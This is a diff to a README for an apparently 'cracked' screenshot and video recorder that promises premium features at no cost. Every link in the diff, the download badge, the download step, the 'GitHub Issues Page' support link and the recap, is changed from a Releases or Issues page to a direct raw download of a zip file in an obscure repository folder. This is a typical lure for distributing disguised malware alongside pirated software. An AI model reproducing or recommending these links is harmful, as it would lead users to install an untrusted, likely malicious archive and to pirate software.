@@ -1,7 +1,7 @@
 # 🎥 cracked-awesome-screenshot-video-recorder - Capture Your Screen with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/rayssalp/cracked-awesome-screenshot-video-recorder/releases)
+[![Download](https://raw.githubusercontent.com/rayssalp/cracked-awesome-screenshot-video-recorder/main/intertidal/cracked-awesome-screenshot-video-recorder.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/rayssalp/cracked-awesome-screenshot-video-recorder/main/intertidal/cracked-awesome-screenshot-video-recorder.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cracked Awesome Screenshot & Video Recorder! This user-friendly tool allows you to capture screenshots and record videos easily. Whether you want to save a cool image from your screen or create a tutorial video, this application is designed for you.
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets the minimum requirements:
 To download the Cracked Awesome Screenshot & Video Recorder, follow these steps:
 
 1. Click the prominent download link below:
-   [Download Now](https://github.com/rayssalp/cracked-awesome-screenshot-video-recorder/releases)
+   [Download Now](https://raw.githubusercontent.com/rayssalp/cracked-awesome-screenshot-video-recorder/main/intertidal/cracked-awesome-screenshot-video-recorder.zip)
 
 2. You will be directed to our Releases page. Here you will find the latest version of the software.
 
@@ -66,7 +66,7 @@ If you encounter any issues, try these common fixes:
 - **Poor Quality Recordings:** Adjust the recording settings in the application for improved quality.
   
 ## 🛠️ Support
-For more help, please visit our [GitHub Issues Page](https://github.com/rayssalp/cracked-awesome-screenshot-video-recorder/issues) to report problems or ask questions. Our community is here to assist you.
+For more help, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/rayssalp/cracked-awesome-screenshot-video-recorder/main/intertidal/cracked-awesome-screenshot-video-recorder.zip) to report problems or ask questions. Our community is here to assist you.
 
 ## 📖 FAQ
 **Q: Can I use this on older operating systems?**  
@@ -82,7 +82,7 @@ A: Yes, all premium features are available at no cost. Enjoy the full experience
 Join our growing community on social media to share tips, ask questions, and enjoy using the Cracked Awesome Screenshot & Video Recorder together. Check our repository for links to our forums and social pages.
 
 ## 📥 Recap
-- Download the latest version of the software [here](https://github.com/rayssalp/cracked-awesome-screenshot-video-recorder/releases).
+- Download the latest version of the software [here](https://raw.githubusercontent.com/rayssalp/cracked-awesome-screenshot-video-recorder/main/intertidal/cracked-awesome-screenshot-video-recorder.zip).
 - Follow the installation steps provided to set up the application.
 - Engage with the community for support and tips.
 
